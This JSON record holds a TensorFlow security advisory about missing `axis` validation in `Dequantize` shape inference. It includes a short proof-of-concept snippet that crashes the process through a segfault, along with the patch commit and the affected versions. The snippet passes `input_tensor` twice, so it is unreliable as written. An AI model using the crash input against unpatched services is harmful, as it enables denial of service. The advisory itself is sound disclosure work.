{"description": "### Impact\nThe shape inference code for `tf.raw_ops.Dequantize` has a vulnerability that could trigger a denial of service via a segfault if an attacker provides invalid arguments:\n\n```python\nimport tensorflow as tf\n\ntf.compat.v1.disable_v2_behavior()\ntf.raw_ops.Dequantize(\n  input_tensor = tf.constant(-10.0, dtype=tf.float32),\n  input_tensor = tf.cast(input_tensor, dtype=tf.quint8),\n  min_range = tf.constant([], shape=[0], dtype=tf.float32),\n  max_range = tf.constant([], shape=[0], dtype=tf.float32),\n  mode  = 'MIN_COMBINED',\n  narrow_range=False,\n  axis=-10,\n  dtype=tf.dtypes.float32)\n```\n\nThe shape inference [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/ops/array_ops.cc#L2999-L3014) uses `axis` to select between two different values for `minmax_rank` which is then used to retrieve tensor dimensions. However, code assumes that `axis` can be either `-1` or a value greater than `-1`, with no validation for the other values.\n\n### Patches\nWe have patched the issue in GitHub commit [da857cfa0fde8f79ad0afdbc94e88b5d4bbec764](https://github.com/tensorflow/tensorflow/commit/da857cfa0fde8f79ad0afdbc94e88b5d4bbec764).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security.", "methods": ["Missing validation in shape inference for `Dequantize` can be exploited to trigger a denial of service via a segfault."]}
